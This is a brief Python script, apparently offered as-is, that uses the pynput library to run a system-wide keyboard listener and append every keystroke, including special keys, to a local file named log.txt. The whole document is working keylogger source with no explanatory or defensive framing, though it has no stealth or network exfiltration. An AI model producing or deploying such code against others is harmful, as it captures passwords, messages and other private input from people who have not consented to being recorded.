from pynput import keyboard

def on_press(key):
    try:
        # For normal characters
        with open("log.txt", "a") as log:
            log.write(f"{key.char}\n")
    except AttributeError:
        # For special keys like space, enter, shift, etc.
        with open("log.txt", "a") as log:
            log.write(f"{key}\n")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    listener.join()